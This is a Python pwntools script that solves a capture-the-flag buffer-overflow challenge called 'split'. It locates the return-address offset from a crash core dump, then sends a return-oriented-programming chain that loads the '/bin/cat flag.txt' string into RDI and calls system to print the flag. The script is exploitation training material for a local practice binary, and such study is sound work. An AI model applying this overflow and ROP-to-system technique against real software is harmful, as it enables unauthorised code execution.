#!/usr/bin/python3

from pwn import *
import time

"""
In this challenge we need to load the string '/bin/cat flag.txt' into RDI and then POP RDI onto
the stack. From here, we can call a portion of the usefulFunction function to call system on that string.

So, we need POP RDI, the System call, and the address of the usefulFunction
We can find a POP RDI; RET at: 0x004007c3
We can find the system call at: 0x0040074b
"/bin/cat flag.txt" string is at: 0x601060 (globally set to "usefulString")
"""

print("""
/*****
  Setting things up
*****/
""")
#context(arch="amd64") # Set context (Not necessary since we are on amd64)
split = "./split" # Grab challenge binary
elf = ELF(split)    # Load it via pwntools as an ELF

# Step 1: Find the vuln
print("""
/*****
  Loop through the binary output
*****/
""")
p = process(split) # Load the binary as a process
print(p.recvline())  # Do this three times to get to the prompt
print(p.recvline())  # 2
print(p.recvline())  # 3

pattern = cyclic(1024) # Generate De Bruin pattern to find offset
p.sendline(pattern)    # Send the pattern

print("""
/*****
  Send the test payload
*****/
""")
print(p.recvline())                                  # Segfault
print("""
/*****
  Sleep to let the corefile create
*****/
""")
time.sleep(2)                                        # Sleep to let the core file generate
core = Coredump("./core")                            # Grab the corefile
seg_addr = int("0x" + hex(core.fault_addr)[10:], 16) # This is really what I needed to steel from the above link
offset = cyclic_find(seg_addr)                       # Grab the offset (this should be 40 for this challenge)
p.close()                                            # Stop the process (it should be stopped already)

# Step 2: Exploit the vuln
p = process(split)                       # Load the binary as a process
gadget0 = 0x004007c3                     # POP RDI
gadget1 = 0x0040074b                     # Call to system (takes 1 string arg)
ret_addr = elf.symbols['usefulFunction'] # Get address we want to end up in
flag = elf.symbols['usefulString']       # Get address of the /bin/cat string

print("""
/*****
  Loop through the binary output
*****/
""")
print(p.recvline())  # Do this three times to get to the prompt
print(p.recvline())  # 2
print(p.recvline())  # 3

"""
Here is what our payload is doing:

1. We set the offset in bytes to get to where we can overwrite the return address of the calling function.
2. We then set the return address to the first gadget (POP RDI)
3. We then put the flag in RDI
4. We then return to the next address, which is gadget1, which is the call to system
5. We pass the flag into the call to system
6. We then return (with the flag output) and set the return address to usefulFunction, successfully exiting the program

So, basically, we exploit the code by sneakily running "cat", but "ls" is still called as expected
"""
"""
For some reason, the below works too; but increasing th enumber of gadget0 calls fails...
"""
#payload = [ b"A"*(offset), p64(gadget0), p64(flag), p64(gadget1), p64(flag), p64(ret_addr) ]
payload = [ b"A"*(offset), p64(gadget0), p64(flag), p64(gadget0), p64(flag), p64(gadget1), p64(flag), p64(ret_addr) ]
p.sendline(b"".join(payload))
print(p.recvline())
print(p.recvline())
print(p.recvline())
print(p.recvline())
p.close()
